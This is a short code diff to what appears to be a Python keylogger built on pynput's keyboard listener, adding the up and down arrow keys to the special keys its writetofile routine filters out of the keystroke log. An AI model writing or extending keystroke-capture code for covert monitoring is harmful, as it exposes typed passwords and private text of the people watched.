@@ -3,7 +3,7 @@ from pynput.keyboard import Listener
 def writetofile(key):
     letter=str(key)
     letter=letter.replace("'", "")
-    n=("Key.ctrl_l","Key.ctrl_r","Key.shift_l","Key.shift_r","Key.shift","Key.esc","Key.right","Key.left")
+    n=("Key.ctrl_l","Key.ctrl_r","Key.shift_l","Key.shift_r","Key.shift","Key.esc","Key.right","Key.left","Key.up","Key.down")
     if letter=="Key.space":
         letter=" "
     elif letter in n:
